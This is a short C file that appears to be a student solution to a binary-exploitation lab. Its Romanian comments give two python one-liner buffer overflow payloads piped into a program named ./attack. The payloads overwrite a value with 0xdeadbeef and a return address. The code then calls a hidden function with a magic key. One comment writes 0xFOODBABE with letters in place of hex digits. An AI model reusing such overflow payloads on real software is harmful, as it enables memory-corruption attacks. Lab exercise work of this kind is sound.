#include <stdio.h>

int main () {
    /* call hidden function from object.o with the "key1 key2" argument */

    // prima cheie : python -c 'print "A" * 64 + "\xef\xbe\xad\xde" ' | ./attack
    // a doua cheie : python -c 'print "A" * 64 + "\xef\xbe\xad\xde" + 4 * "B" + "\x0c\x93\x04\x08" ' | ./attack
    // 4027431614 = 0xFOODBABE
    order_please("johns pizzeria", 4027431614);
    return 0;
}
0804939f